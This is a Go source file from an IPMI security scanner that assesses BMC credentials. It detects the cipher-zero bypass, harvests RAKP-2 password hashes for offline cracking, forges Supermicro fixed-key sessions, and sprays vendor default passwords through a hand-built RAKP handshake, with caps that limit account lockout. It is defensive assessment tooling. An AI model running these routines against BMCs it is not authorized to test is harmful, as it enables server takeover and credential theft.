package ipmi

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"hash"
	"strings"
	"time"

	"github.com/runZeroInc/oobscan/pkg/creds"
)

// maxOnlineAttempts caps active RAKP3/4 login attempts per username so a scan
// cannot walk a full password spray into an account lockout. The online path is
// only a fallback for BMCs that do not leak the RAKP-2 hash (patched
// CVE-2013-4786); when the hash leaks we recover the password offline instead.
const maxOnlineAttempts = 6

// When SMCRAKP fixed-key auth is detected, probe a tiny username set with
// vendor defaults so real account passwords are still discovered and can be
// preferred for post-auth inventory.
const maxOnlineUsersAfterSMCRAKP = 2

// Final-phase SMCRAKP online password testing is bounded so scans do not loop
// indefinitely on large candidate lists.
const maxSMCRAKPOnlinePasswordAttempts = 256

// maxOracleUsernames bounds the username walk on a BMC that hands out a RAKP-2 for
// any name. Its hashes are duplicate disclosures past the first, but the account
// names still identify real accounts, so a small sample keeps the inventory without
// spraying the whole list for material that adds nothing.
const maxOracleUsernames = 4

// rakpLoginRole is the requested-role byte the online login path sends in RAKP1:
// name-only username lookup (0x10) plus administrator (0x04). RAKP3's auth code
// and the session key derivation both sign it, so the teardown has to reuse the
// same value or the Close Session is signed with keys the BMC does not hold.
const rakpLoginRole byte = 0x14

// AuthOptions drives RunAuth.
type AuthOptions struct {
	Usernames      []string      // usernames to probe; empty = creds.Usernames()
	Vendor         string        // vendor slug for credential prioritization (e.g. "dell")
	Ciphers        []int         // advertised cipher suite IDs (from Get Channel Cipher Suites); empty = broad default
	Online         bool          // allow active RAKP3/4 login attempts (default true)
	OfflineCrack   bool          // recover passwords from the leaked RAKP-2 hash (default true)
	Permute        bool          // deep permutation pass during offline crack (CPU-intensive)
	ExtraPasswords []string      // caller-supplied password candidates
	Timeout        time.Duration //
}

// AuthReport is the result of RunAuth against one BMC.
type AuthReport struct {
	Host         string       `json:"host"`
	Port         int          `json:"port"`
	Suite        *CipherAlgos `json:"suite,omitempty"` // negotiated suite used for credential probes
	CipherZero   bool         `json:"cipherZero"`      // cipher suite 0 (no-auth) accepted - CVE-2013-4782
	FakeUsername bool         `json:"fakeUsername"`    // BMC returns a RAKP-2 hash for a random username (no user validation)
	// CipherZeroSID is the session ID the BMC assigned to the no-auth session, and
	// FakeUsernameSID the one it assigned to the random-username RAKP-1. They are the
	// per-host evidence: the booleans above only say a session opened, so a proof built
	// from them alone would be identical on every host.
	CipherZeroSID   uint32 `json:"cipherZeroSid,omitempty"`
	FakeUsernameSID uint32 `json:"fakeUsernameSid,omitempty"`
	// FakeUsernameProbe is the random username that was accepted, so the finding
	// names the nonexistent account rather than asserting that one existed.
	FakeUsernameProbe string        `json:"fakeUsernameProbe,omitempty"`
	Results           []RAKPResult  `json:"results"` // one per username that produced a RAKP-2
	Cracked           []CrackResult `json:"cracked"` // recovered credentials
}

// RunAuth performs the active credential assessment against a BMC:
//  1. cipher-0 bypass detection (CVE-2013-4782),
//  2. fake-username detection (does the BMC validate usernames?),
//  3. per-username RAKP-1/2 hash extraction + offline crack, and
//  4. optional online RAKP-3/4 login for accounts whose hash did not leak.
//
// It is the single entry point the scan pipeline calls for IPMI credentials.
func RunAuth(ctx context.Context, host string, port int, opts AuthOptions) (*AuthReport, error) {
	if opts.Timeout == 0 {
		opts.Timeout = 5 * time.Second
	}
	rep := &AuthReport{Host: host, Port: port}

	// (1) Cipher suite 0 - open a session with auth algorithm None.
	if z, _ := DoRAKP12(host, port, "", RAKPNone, IntegrityNone, ConfNone, opts.Timeout); z != nil && z.BMCSID != 0 && z.ErrorCode == 0 {
		rep.CipherZero = true
		rep.CipherZeroSID = z.BMCSID
	}

	// Find a single cipher suite the BMC accepts by opening a null-user session with
	// each candidate triple. Hardened BMCs (OpenBMC = suite 17 only) reject weak
	// integrity/confidentiality, so we must offer the suite's real algorithms.
	// Negotiating once rather than per username avoids per-user timeout storms on a
	// rejecting or flaky BMC.
	var suite *CipherAlgos
	for _, ca := range CipherTriples(opts.Ciphers) {
		if err := ctx.Err(); err != nil {
			return rep, err
		}
		r, _ := DoRAKP12(host, port, "", ca.Auth, ca.Integrity, ca.Conf, opts.Timeout)
		if r != nil && r.BMCSID != 0 { // Open Session accepted this suite
			ca := ca
			suite = &ca
			break
		}
	}
	if suite == nil {
		return rep, nil // BMC accepts no RAKP cipher suite (or is unreachable)
	}
	rep.Suite = suite

	// (2) Does the BMC hand out a RAKP-2 for a username that cannot exist?
	var fakeUser string
	rep.FakeUsername, fakeUser, rep.FakeUsernameSID = detectFakeUsername(host, port, *suite, opts.Timeout)
	rep.FakeUsernameProbe = fakeUser

	// Always include the shared username pool used by the rest of auth probing,
	// but keep caller-provided usernames (e.g. --creds) first.
	users := preferredUsernames(opts.Usernames, creds.UsernamesFor(opts.Vendor))

	consecDrop, totalDrop := 0, 0
	for i, u := range users {
		if err := ctx.Err(); err != nil {
			return rep, err
		}
		r, err := DoRAKP12(host, port, u, suite.Auth, suite.Integrity, suite.Conf, opts.Timeout)
		// A dropped RAKP is often just transient rate-limiting under concurrent
		// probing. The first two usernames are the vendor-priority accounts, so a
		// drop there would skip the very credential we want - retry those once.
		if (r == nil || r.BMCSID == 0) && i < 2 && ctx.Err() == nil {
			r, err = DoRAKP12(host, port, u, suite.Auth, suite.Integrity, suite.Conf, opts.Timeout)
		}
		// Rate-limit backoff: many BMCs drop rapid RAKP attempts, so each dropped
		// attempt costs a full timeout. Bail on 4 consecutive or 8 total drops rather
		// than time out on the whole username list. A RAKP-2 error for an invalid
		// user is still a response and does not count as a drop.
		if r == nil || r.BMCSID == 0 {
			consecDrop++
			totalDrop++
			if consecDrop >= 4 || totalDrop >= 8 {
				break
			}
			continue
		}
		consecDrop = 0
		if err != nil || len(r.RAKPHash) == 0 {
			continue // invalid user (RAKP-2 error) or no hash - a response, not a drop
		}
		// Hash leaked: crack it offline (no lockout risk).
		if opts.OfflineCrack {
			if cr := CrackRAKP(r, CrackOptions{Vendor: opts.Vendor, ExtraPasswords: opts.ExtraPasswords, Permute: opts.Permute}); cr != nil {
				cr.AcceptsAny = rep.FakeUsername
				switch {
				case cr.PasswordType == "smcrakp-fixed-key":
					cr.LoginTested = true
					if ok, proof, verr := rakpSessionLoginWithSuiteKey(host, port, cr.Username, smcRAKPFixedKey, *suite, opts.Timeout); verr == nil && ok {
						cr.Verified = true
						cr.Proof = proof
						// A completed RAKP-3/4 forge only proves the session opens. It is
						// exploitable only if the BMC also executes unprotected
						// (no-integrity/no-encrypt) in-session commands, the ATEN H3 bypass.
						// BMCs that enforce per-session integrity (X14/OpenBMC) forge the
						// session but drop the cleartext command.
						if capable, cproof := smcrakpCommandCapable(host, port, cr.Username, *suite, opts.Timeout); capable {
							cr.CommandCapable = true
							cr.Proof = proof + " " + cproof
						} else {
							cr.Proof = proof + " noIntegrityCmd=rejected integrity=enforced"
						}
					} else {
						cr.Proof = "rakp2Hmac=verified smcrakpFixedKey=true rakp4Verify=unavailable"
					}
				case !rep.FakeUsername:
					// The BMC validated the username (it errored on a fake one), so the
					// account exists and a RAKP-2 HMAC matching this password is
					// cryptographic proof of that account's key - a login would succeed.
					// No active login needed, which avoids lockout and rate limits.
					cr.Verified = true
					cr.Proof = rakp2Proof(r)
				case opts.Online:
					// Accepts-any-username BMC: the recovered key can't be attributed to
					// a real account from the hash alone, so confirm with an actual
					// RAKP-3/4 login. A completed RAKP-4 is a genuine authenticated
					// session; a failure means the offline crack is not a usable login.
					cr.LoginTested = true
					if ok, proof, verr := rakpSessionLoginWithSuite(host, port, cr.Username, cr.Password, *suite, opts.Timeout); verr == nil && ok {
						cr.Verified = true
						cr.Proof = proof
					}
				}
				r.Crack = cr
				rep.Cracked = append(rep.Cracked, *cr)
			}
		}
		rep.Results = append(rep.Results, *r)
		// A proven credential ends the walk: further hashes cannot improve on a
		// password already in hand.
		if len(rep.Cracked) > 0 {
			break
		}
		// An accepts-any-username BMC returns a RAKP-2 for every name asked, so the
		// hashes it hands out past the first are duplicate disclosures for accounts
		// that need not exist. Stopping dead on the first one also discards the
		// account names, which are what post-auth and the operator actually use, so
		// take a bounded sample of the real username list instead of the whole spray.
		if rep.FakeUsername && len(rep.Results) >= maxOracleUsernames {
			break
		}
	}

	// Online fallback, used only when the BMC leaked no hash at all (patched
	// CVE-2013-4786). Where it does leak, a no-hash username just means the account
	// does not exist, so spraying it via RAKP-3/4 is pointless and slow.
	if len(rep.Results) == 0 && opts.Online {
		for i, u := range users {
			if i >= 3 || ctx.Err() != nil { // top vendor-default usernames only
				break
			}
			if cr, matchedSuite := onlineLoginWithSuites(ctx, host, port, u, onlineSuites(*suite, opts.Ciphers), opts); cr != nil {
				if matchedSuite != nil {
					rep.Suite = matchedSuite
				}
				rep.Cracked = append(rep.Cracked, *cr)
				break
			}
		}
	}

	return rep, nil
}

// SMCRAKPOnlinePasswordReport summarizes final-phase online password testing
// for SMCRAKP fixed-key targets.
type SMCRAKPOnlinePasswordReport struct {
	Attempted  bool         `json:"attempted"`
	Usernames  []string     `json:"usernames,omitempty"`
	Suites     []int        `json:"suites,omitempty"`
	Candidates int          `json:"candidates"`
	Attempts   int          `json:"attempts"`
	SessionOK  bool         `json:"sessionOk"`
	Credential *CrackResult `json:"credential,omitempty"`
}

// RunSMCRAKPOnlinePasswordEnum runs final-phase online password testing after
// post-auth collection has completed (or failed), using the same candidate
// ordering as offline cracking plus caller-supplied extras.
func RunSMCRAKPOnlinePasswordEnum(ctx context.Context, host string, port int, auth *AuthReport, opts AuthOptions, progressEvery int, onProgress func(attempts int, sessionAlive bool)) *SMCRAKPOnlinePasswordReport {
	rep := &SMCRAKPOnlinePasswordReport{}
	if !opts.Online || auth == nil || auth.Suite == nil || !hasSMCRAKPCrack(auth.Cracked) {
		return rep
	}
	users := preferredUsernames(opts.Usernames, creds.UsernamesFor(opts.Vendor))
	targetUsers := smcrakpOnlineUserCandidates(auth.Cracked, users, maxOnlineUsersAfterSMCRAKP)
	if len(targetUsers) == 0 {
		return rep
	}
	allSuites := onlineSuites(*auth.Suite, opts.Ciphers)
	suites := oneSMCRAKPOnlineSuite(allSuites)
	if len(suites) == 0 {
		return rep
	}
	passwords := offlineCrackPasswordCandidates(opts.Vendor, opts.ExtraPasswords, opts.Permute)
	if len(passwords) == 0 {
		return rep
	}

	rep.Attempted = true
	rep.Usernames = append(rep.Usernames, targetUsers...)
	for _, s := range suites {
		rep.Suites = append(rep.Suites, s.Suite)
	}
	rep.Candidates = len(passwords)
	if progressEvery <= 0 {
		progressEvery = 100
	}

	probeSessionAlive := func() bool { return false }
	for _, u := range targetUsers {
		for _, s := range suites {
			ks, err := OpenSession20WithKey(host, port, u, smcRAKPFixedKey, s, opts.Timeout)
			if err != nil {
				continue
			}
			defer ks.Close()
			probeSessionAlive = func() bool {
				cc, d, err := ks.Exec(NetFnApp, CmdGetDeviceID, nil)
				return err == nil && cc == 0x00 && len(d) > 0
			}
			rep.SessionOK = probeSessionAlive()
			break
		}
		if rep.SessionOK {
			break
		}
	}

	attempts := 0
	for _, u := range targetUsers {
		for _, s := range suites {
			for _, cand := range passwords {
				if attempts >= maxSMCRAKPOnlinePasswordAttempts || ctx.Err() != nil {
					rep.Attempts = attempts
					return rep
				}
				attempts++
				if attempts%progressEvery == 0 && onProgress != nil {
					onProgress(attempts, probeSessionAlive())
				}
				ok, proof, err := rakpSessionLoginWithSuite(host, port, u, cand.Password, s, opts.Timeout)
				if err == nil && ok {
					rep.Attempts = attempts
					rep.SessionOK = probeSessionAlive()
					rep.Credential = &CrackResult{
						Username:     u,
						Password:     cand.Password,
						PasswordType: cand.Kind,
						Vendor:       opts.Vendor,
						Attempts:     attempts,
						Verified:     true,
						LoginTested:  true,
						Proof:        proof,
					}
					return rep
				}
			}
		}
	}
	rep.Attempts = attempts
	rep.SessionOK = probeSessionAlive()
	return rep
}

func oneSMCRAKPOnlineSuite(in []CipherAlgos) []CipherAlgos {
	if len(in) == 0 {
		return nil
	}
	preferred := []int{1, 6, 15, 16, 3, 17, 2, 7, 8, 11, 12}
	for _, sid := range preferred {
		for _, ca := range in {
			if ca.Suite == sid {
				return []CipherAlgos{ca}
			}
		}
	}
	return []CipherAlgos{in[0]}
}

func onlineLoginWithSuites(ctx context.Context, host string, port int, user string, suites []CipherAlgos, opts AuthOptions) (*CrackResult, *CipherAlgos) {
	for _, ca := range suites {
		if ctx.Err() != nil {
			return nil, nil
		}
		if cr := onlineLogin(ctx, host, port, user, ca, opts); cr != nil {
			match := ca
			return cr, &match
		}
	}
	return nil, nil
}

func onlineSuites(preferred CipherAlgos, advertised []int) []CipherAlgos {
	all := CipherTriples(advertised)
	out := make([]CipherAlgos, 0, len(all)+1)
	seen := map[int]bool{}
	add := func(c CipherAlgos) {
		if c.Suite == 0 {
			return
		}
		if seen[c.Suite] {
			return
		}
		seen[c.Suite] = true
		out = append(out, c)
	}
	add(preferred)
	// Some Supermicro targets accept SHA1/SHA1-96/AES (suite 3 semantics)
	// for command-capable sessions even when it is absent from advertised IDs.
	add(CipherAlgos{Suite: 3, Auth: RAKPHMACSHA1, Integrity: IntegrityHMACSHA196, Conf: ConfAESCBC})
	for _, c := range all {
		add(c)
	}
	if len(out) == 0 {
		out = append(out, CipherAlgos{Suite: 3, Auth: RAKPHMACSHA1, Integrity: IntegrityHMACSHA196, Conf: ConfAESCBC})
	}
	if len(out) > 4 {
		out = out[:4]
	}
	return out
}

// smcrakpCommandCapable opens a SMCRAKP-forged session and verifies the BMC
// executes an unprotected (no-integrity/no-encrypt) in-session command. The forged
// session has no valid K1/K2, so a command lands only where the BMC honors
// payload-type-0x00 packets after activation: it prefers the null-protection suite 1
// and forces cleartext, then issues Get Device ID. BMCs enforcing per-session
// integrity forge the session but drop the command. (true, proof) needs a reply.
func smcrakpCommandCapable(host string, port int, username string, negotiated CipherAlgos, timeout time.Duration) (bool, string) {
	auth := negotiated.Auth
	if auth == 0 {
		auth = RAKPHMACSHA1
	}
	// Prefer an explicit no-integrity/no-encrypt suite; fall back to the
	// negotiated suite with forced-cleartext commands for BMCs that advertise
	// only integrity suites yet still honor the H3 cleartext path.
	suites := []CipherAlgos{{Suite: 1, Auth: auth, Integrity: IntegrityNone, Conf: ConfNone}}
	if negotiated.Integrity != IntegrityNone || negotiated.Conf != ConfNone {
		suites = append(suites, negotiated)
	}
	for _, user := range smcrakpUserCandidates(username) {
		for _, su := range suites {
			s, err := OpenSession20WithKey(host, port, user, smcRAKPFixedKey, su, timeout)
			if err != nil {
				continue
			}
			s.SetCommandProtection(protectionCleartext)
			cc, d, err := s.Exec(NetFnApp, CmdGetDeviceID, nil)
			s.Close()
			if err == nil && cc == 0x00 && len(d) >= 11 {
				return true, fmt.Sprintf("noIntegrityCmd=GetDeviceID cc=0x00 bytes=%d suite=%d protection=none(no-integrity/no-encrypt)", len(d), su.Suite)
			}
		}
	}
	return false, ""
}

func hasSMCRAKPCrack(cracked []CrackResult) bool {
	for _, cr := range cracked {
		if cr.PasswordType == "smcrakp-fixed-key" {
			return true
		}
	}
	return false
}

func smcrakpOnlineUserCandidates(cracked []CrackResult, users []string, limit int) []string {
	if limit <= 0 {
		return nil
	}
	seen := map[string]struct{}{}
	out := make([]string, 0, limit)
	add := func(u string) {
		u = strings.TrimSpace(u)
		if u == "" || len(out) >= limit {
			return
		}
		key := strings.ToLower(u)
		if _, ok := seen[key]; ok {
			return
		}
		seen[key] = struct{}{}
		out = append(out, u)
	}
	for _, cr := range cracked {
		if cr.PasswordType == "smcrakp-fixed-key" {
			add(cr.Username)
		}
	}
	for _, u := range users {
		add(u)
		if len(out) >= limit {
			break
		}
	}
	return out
}

func preferredUsernames(preferred, common []string) []string {
	out := make([]string, 0, len(preferred)+len(common))
	seen := map[string]struct{}{}
	add := func(in []string) {
		for _, u := range in {
			// Keep the empty/null username (""). On BMCs with an enabled anonymous
			// account (User ID 1) it yields a distinct, often crackable RAKP-2 hash
			// even when the named accounts hold a custom password, so dropping it
			// silently loses most of the offline-crack yield.
			u = strings.TrimSpace(u)
			key := strings.ToLower(u)
			if _, ok := seen[key]; ok {
				continue
			}
			seen[key] = struct{}{}
			out = append(out, u)
		}
	}
	add(preferred)
	add(common)
	return out
}

// detectFakeUsername probes with a random 16-hex username. A BMC that returns a
// valid RAKP-2 (error 0 + hash) for it does not validate usernames, so RAKP
// user-enumeration is impossible against it (and every username "exists").
// It also returns the username it invented and the session ID the BMC assigned, so
// the finding can prove which nonexistent user was accepted instead of restating
// the boolean.
func detectFakeUsername(host string, port int, suite CipherAlgos, timeout time.Duration) (ok bool, user string, sid uint32) {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return false, "", 0
	}
	user = hex.EncodeToString(b)
	r, err := DoRAKP12(host, port, user, suite.Auth, suite.Integrity, suite.Conf, timeout)
	if err != nil || r == nil || r.ErrorCode != 0 || len(r.RAKPHash) == 0 {
		return false, "", 0
	}
	return true, user, r.BMCSID
}

// onlineLogin attempts a capped, vendor-first set of default passwords against
// one username using the full RAKP-3/4 handshake. Used only when the RAKP-2
// hash did not leak. Returns a CrackResult on the first accepted password.
func onlineLogin(ctx context.Context, host string, port int, user string, suite CipherAlgos, opts AuthOptions) *CrackResult {
	tried := map[string]struct{}{}
	n := 0
	for _, c := range creds.CredsFor(opts.Vendor, creds.ClassIPMI) {
		if n >= maxOnlineAttempts {
			break
		}
		if err := ctx.Err(); err != nil {
			return nil
		}
		if _, dup := tried[c.Password]; dup {
			continue
		}
		tried[c.Password] = struct{}{}
		n++
		ok, proof, err := rakpSessionLoginWithSuite(host, port, user, c.Password, suite, opts.Timeout)
		if err == nil && ok {
			// Recovered by a completed RAKP-3/4 login, so verified by construction.
			return &CrackResult{Username: user, Password: c.Password, PasswordType: "online", Vendor: opts.Vendor, Attempts: n, Verified: true, LoginTested: true, Proof: proof}
		}
	}
	return nil
}

// rakpSessionLoginWithSuite runs the full RAKP3/4 login using the requested
// suite triple. This is the online verification path for cracked/default creds.
func rakpSessionLoginWithSuite(host string, port int, username, password string, suite CipherAlgos, timeout time.Duration) (bool, string, error) {
	return rakpSessionLoginWithSuiteSecret(host, port, username, []byte(password), suite, timeout, false)
}

// rakpSessionLoginWithSuiteKey runs the full RAKP3/4 login with an explicit
// key instead of a password string. Used for SMCRAKP fixed-key verification.
func rakpSessionLoginWithSuiteKey(host string, port int, username string, key []byte, suite CipherAlgos, timeout time.Duration) (bool, string, error) {
	return rakpSessionLoginWithSuiteSecret(host, port, username, key, suite, timeout, true)
}

func rakpSessionLoginWithSuiteSecret(host string, port int, username string, secret []byte, suite CipherAlgos, timeout time.Duration, smcrakp bool) (bool, string, error) {
	c, err := NewClient(host, port, timeout)
	if err != nil {
		return false, "", err
	}
	defer c.Close()

	var cSID uint32
	_ = binary.Read(rand.Reader, binary.LittleEndian, &cSID)
	if cSID == 0 {
		cSID = 0xa0a2a3a4
	}
	cRand := make([]byte, 16)
	if _, err := rand.Read(cRand); err != nil {
		return false, "", err
	}

	if suite.Auth == 0 {
		suite.Auth = RAKPHMACSHA1
	}
	// Open Session with the selected suite.
	var os bytes.Buffer
	os.WriteByte(0x00)           // message tag
	os.WriteByte(0x04)           // requested max privilege (admin)
	os.Write([]byte{0x00, 0x00}) // reserved
	_ = binary.Write(&os, binary.LittleEndian, cSID)
	os.Write([]byte{0x00, 0x00, 0x00, 0x08, suite.Auth, 0, 0, 0})      // auth payload
	os.Write([]byte{0x01, 0x00, 0x00, 0x08, suite.Integrity, 0, 0, 0}) // integrity payload
	os.Write([]byte{0x02, 0x00, 0x00, 0x08, suite.Conf, 0, 0, 0})      // confidentiality payload
	osResp, err := c.Send(buildRMCPPlus(PayloadOpenSessionReq, 0, 0, os.Bytes()))
	if err != nil {
		return false, "", fmt.Errorf("open-session: %w", err)
	}
	bmcSID, err := parseOpenSessionResp(osResp)
	if err != nil {
		return false, "", err
	}

	// RAKP-1.
	var r1 bytes.Buffer
	r1.WriteByte(0x00)
	r1.Write([]byte{0, 0, 0})
	_ = binary.Write(&r1, binary.LittleEndian, bmcSID)
	r1.Write(cRand)
	r1.WriteByte(rakpLoginRole) // requested privilege (admin | name-only bit)
	r1.Write([]byte{0, 0})
	r1.WriteByte(byte(len(username)))
	r1.WriteString(username)
	r2Resp, err := c.Send(buildRMCPPlus(PayloadRAKP1, 0, 0, r1.Bytes()))
	if err != nil {
		return false, "", fmt.Errorf("rakp1: %w", err)
	}
	res := &RAKPResult{Username: username, AuthAlgo: suite.Auth, IntegrityAlgo: suite.Integrity, ConfAlgo: suite.Conf, ClientSID: cSID, BMCSID: bmcSID, ClientRand: cRand}
	if err := parseRAKP2(r2Resp, res); err != nil {
		return false, "", err
	}

	// RAKP-3 Key Exchange Auth Code: HMAC_secret( Rm | SIDc | Role | ULen | UName ).
	kec := rakpKEC3ByAlgoKey(suite.Auth, secret, res.BMCRand, cSID, rakpLoginRole, username)
	var r3 bytes.Buffer
	r3.WriteByte(0x00) // message tag
	r3.WriteByte(0x00) // status code
	r3.Write([]byte{0, 0})
	_ = binary.Write(&r3, binary.LittleEndian, bmcSID)
	r3.Write(kec)
	r4Resp, err := c.Send(buildRMCPPlus(PayloadRAKP3, 0, 0, r3.Bytes()))
	if err != nil {
		return false, "", fmt.Errorf("rakp3: %w", err)
	}
	// RAKP-4 status 0x00 => the BMC accepted our auth code => password correct.
	p, err := rmcpPlusPayload(r4Resp)
	if err != nil {
		return false, "", err
	}
	if len(p) < 2 {
		return false, "", errors.New("short RAKP4")
	}
	if p[1] == 0x00 {
		// A successful RAKP4 activates a session that only Close Session or the
		// BMC's idle timeout releases, so every accepted credential would otherwise
		// hold a slot for the rest of the scan.
		closeActivatedRAKPSession(c, username, secret, cRand, res.BMCRand, suite, cSID, bmcSID, timeout)
	}
	proof := fmt.Sprintf("openSession=ok bmcSession=0x%08x rakp2Status=0x%02x rakp4Status=0x%02x", bmcSID, res.ErrorCode, p[1])
	if smcrakp {
		proof = fmt.Sprintf("bmcSession=0x%08x rakp2Status=0x%02x rakp4Status=0x%02x", bmcSID, res.ErrorCode, p[1])
	}
	return p[1] == 0x00, proof, nil
}

func rakp2Proof(r *RAKPResult) string {
	if r == nil {
		return "rakp2Status=0x00"
	}
	return fmt.Sprintf("openSession=ok bmcSession=0x%08x rakp2Status=0x%02x rakp2Hmac=verified", r.BMCSID, r.ErrorCode)
}

func rakpKEC3ByAlgoKey(algo byte, key, bmcRand []byte, cSID uint32, role byte, username string) []byte {
	var buf bytes.Buffer
	buf.Write(bmcRand)
	_ = binary.Write(&buf, binary.LittleEndian, cSID)
	buf.WriteByte(role)
	buf.WriteByte(byte(len(username)))
	buf.WriteString(username)
	mac := hmacByAlgo(algo, key)
	mac.Write(buf.Bytes())
	return mac.Sum(nil)
}

// hmacByAlgo returns an HMAC keyed by key for the given RAKP auth algorithm.
func hmacByAlgo(algo byte, key []byte) hash.Hash {
	switch algo {
	case RAKPHMACMD5:
		return hmac.New(md5.New, key)
	case RAKPHMACSHA256:
		return hmac.New(sha256.New, key)
	default:
		return hmac.New(sha1.New, key)
	}
}
